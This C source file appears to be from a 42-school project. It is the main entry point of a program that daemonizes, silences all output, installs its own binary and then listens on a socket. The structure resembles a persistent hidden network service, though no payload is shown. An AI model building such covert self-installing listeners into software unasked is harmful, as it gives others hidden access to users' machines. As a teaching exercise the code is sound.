/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: damien <damien@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/03/06 19:13:32 by jmaia             #+#    #+#             */
/*   Updated: 2024/06/14 13:19:37 by damien           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>

#include "daemon.h"
#include "polling.h"

static bool disable_input_output();

int main(int ac, char **av)
{
	int success;

	(void) ac;
	success = acquire_lock();
	if (!success)
		return (1);

	//THE ONLY AUTHORISED PRINT
	printf("jmaia dhubleur\n");

	if (!daemonize())
	{
		release_lock();
		return (2);
	}

	setup_cleanup();
	disable_input_output();

	if (!install(av[0]))
		return (3);
	
	int sockfd = prepare_socket();
	if (sockfd == -1)
		return (4);
	poll_routine(sockfd);
}

static bool disable_input_output()
{
	int null_fd;
	bool func_result;

	null_fd = open("/dev/null", O_RDWR);
	if (null_fd == -1)
		return false;
	func_result = (dup2(null_fd, 0) != -1);
	func_result = (dup2(null_fd, 1) != -1) && func_result;
	func_result = (dup2(null_fd, 2) != -1) && func_result;
	close(null_fd);
	return func_result;
}
